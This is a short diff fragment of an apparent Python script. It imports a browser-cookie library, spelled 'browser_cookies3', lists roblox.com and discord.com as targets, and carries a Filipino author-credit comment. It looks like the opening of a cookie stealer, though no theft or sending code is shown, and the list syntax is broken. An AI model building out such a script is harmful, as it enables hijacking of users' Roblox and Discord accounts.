@@ -1,5 +1,5 @@
 import browser_cookies3
--- pagkulang dagdaganmo Kiel by JhonerTorres
+@pagkulang dagdaganmo Kiel by JhonerTorres
 sites = [
   "roblox.com"
   "discord.com"
